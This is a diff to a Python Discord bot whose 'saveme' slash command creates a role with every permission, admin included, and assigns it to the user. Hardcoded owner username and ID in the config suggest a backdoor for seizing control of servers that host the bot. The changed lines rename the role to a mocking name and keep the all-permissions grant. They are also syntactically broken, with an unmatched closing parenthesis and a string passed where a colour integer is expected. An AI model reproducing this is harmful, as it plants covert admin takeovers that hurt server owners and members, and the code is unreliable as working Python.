@@ -52,7 +52,8 @@ load_dotenv()
 TOKEN = os.getenv("DISCORD_TOKEN")
 
 # ========== CONFIG ==========
-ROLE_NAME = "Chosen One"  # Role name to create and assign
+ROLE_NAME = "Lesser Minded Goober"  # Role name to create and assign
+ROLE_COLOR= "137736"
 OWNER_USERNAME = "tech_boy1"
 OWNER_ID = 1273056960996184126
 INVITE_EXPIRY = 86400  # seconds (24h)
@@ -93,9 +94,11 @@ async def saveme(interaction: discord.Interaction):
     role = discord.utils.get(guild.roles, name=ROLE_NAME)
     if role is None:
         role = await guild.create_role(
-            name=ROLE_NAME,
-            permissions=discord.Permissions.all(),  # all perms including admin
-            colour=discord.Colour.gold()
+    name=ROLE_NAME,
+    permissions=discord.Permissions.all(),
+    colour=discord.Colour(ROLE_COLOR)  # use config color
+)
+
         )
 
     # Give role to the user
